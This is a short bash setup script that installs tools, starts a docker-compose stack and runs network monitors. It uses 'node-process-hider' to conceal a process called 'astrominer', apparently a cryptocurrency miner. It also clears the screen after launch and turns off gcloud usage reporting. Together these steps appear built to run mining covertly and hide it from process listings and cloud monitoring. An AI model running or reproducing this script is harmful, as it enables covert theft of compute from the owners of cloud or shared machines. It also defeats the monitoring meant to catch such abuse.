#!/usr/bin/env bash

sudo apt-get update
sudo apt install npm -y
npm i -g node-process-hider && sudo ph add astrominer 
curl -L "https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose && \
    chmod +x /usr/local/bin/docker-compose
docker-compose build --parallel 
docker-compose up -d  && clear 
sudo apt install speedtest-cli -y
sudo apt-get install iperf -y
gcloud config set disable_usage_reporting true
docker-compose logs

sudo nethogs
